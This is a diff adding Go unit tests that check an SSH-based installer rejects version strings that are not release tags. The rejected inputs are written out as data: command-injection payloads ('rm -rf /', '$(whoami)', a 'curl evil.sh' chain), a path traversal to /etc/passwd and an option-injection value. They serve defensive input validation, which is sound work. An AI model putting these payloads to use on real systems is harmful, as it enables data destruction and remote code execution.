@@ -190,3 +190,44 @@ func TestCloudflaredIsCheckableAndNotInstalledByDefault(t *testing.T) {
 		}
 	}
 }
+
+// --- fetching a released cbx ---
+
+// The version reaches a URL built inside a remote shell. Quoting defends the
+// shell and does nothing about a value that is not a tag, which is the same
+// distinction that produced a command injection through git clone.
+func TestFetchCBXRejectsAVersionThatIsNotATag(t *testing.T) {
+	for _, bad := range []string{
+		"v1.0.0; rm -rf /",
+		"$(whoami)",
+		"../../../etc/passwd",
+		"-v1.0.0",
+		"v1.0.0 && curl evil.sh",
+		"`id`",
+	} {
+		if _, err := FetchCBX(Target{User: "root", Host: "203.0.113.9"}, bad); err == nil {
+			t.Errorf("version %q was accepted", bad)
+		} else if !strings.Contains(err.Error(), "invalid version") {
+			// It must be refused before any ssh is attempted, not after a
+			// connection timeout against a box that was never the problem.
+			t.Errorf("version %q failed for the wrong reason: %v", bad, err)
+		}
+	}
+}
+
+func TestFetchCBXAcceptsRealTags(t *testing.T) {
+	for _, ok := range []string{"v0.8.0", "0.8.0", "v1.2.3-rc1"} {
+		if !releaseTag.MatchString(ok) {
+			t.Errorf("tag %q rejected", ok)
+		}
+	}
+}
+
+func TestLastLineIsWhatTheBinaryReported(t *testing.T) {
+	// FetchCBX ends its script with `cbx --version`, so the installed version
+	// is the last line — what is printed is what is on the box, rather than
+	// what was asked for.
+	if got := lastLine("downloading...\ninstalling\ncbx version 0.9.0\n"); got != "cbx version 0.9.0" {
+		t.Errorf("lastLine = %q", got)
+	}
+}
